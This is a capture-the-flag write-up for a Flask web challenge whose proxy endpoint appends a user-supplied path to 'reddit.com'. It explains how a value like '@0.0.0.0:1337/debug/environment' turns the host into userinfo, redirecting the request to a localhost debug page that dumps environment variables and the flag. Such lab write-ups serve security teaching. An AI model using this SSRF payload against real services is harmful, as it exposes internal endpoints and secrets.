# Proxyasaservice

In this web challenge the app is a python flask web app which a simple proxy application which basically getting the content fo reddit pages randomly selecting from cat_meme_subredits and displaying the result,It is getting through the url parameter from the get request method.

```bash
SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug     = Blueprint('debug', __name__)

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]

        random_subreddit = random.choice(cat_meme_subreddits)

        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())
```

We have another debug mode page named as environment which is a debug function which checks if the requests comes from the [localhost](http://localhost) and displays the os environment variables.

```bash
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }

    return jsonify(environment_info) 
```

Now exploiting the vulnerability in this is how the random rediit pages are being attached form url parameter (which is user supplied)

```bash
 target_url = f'http://{SITE_NAME}{url}'
```

In this target url it attaches the page for example the site is reddit[.]com and the url is /r/cats so the target url would be 

```bash
target_url = http://reddit.com/r/cats
```

NOw the basic structure of url in http protocol is 

```bash
http://username:password@host:port/path?parameter=query
```

Here is the @ sign represents the host so aything before the @ is treated as user info and after the @ is treated as host and if no @ is provided it starts with the host and further.

In the above code the url parameter we can give the value as @0.0.0.0:1337/debug/environment and this will result in

```bash
target_url = http://rediit.com@0.0.0.0:1337/debug/environment
```

and the flask reuqest will treat it as 

<img width="675" height="198" alt="image" src="https://github.com/user-attachments/assets/defa50cc-9985-4575-a9aa-d480d66dae5b" />


So this will send request to 0.0.0.0:1337/debug/environment and get the contents of ti

<img width="1228" height="586" alt="image" src="https://github.com/user-attachments/assets/f24c99cf-d944-435a-9b0f-9936d0668791" />


And this will give us our flag.
